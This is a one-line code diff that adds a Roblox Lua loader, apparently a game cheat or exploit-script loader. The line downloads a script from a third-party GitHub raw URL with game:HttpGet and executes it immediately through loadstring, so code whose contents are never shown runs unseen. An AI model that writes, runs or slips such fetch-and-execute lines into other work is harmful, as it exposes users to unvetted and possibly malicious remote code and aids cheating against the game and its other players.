@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/prospecting-spam6-vafw3ca0jrjul2.lua"))()
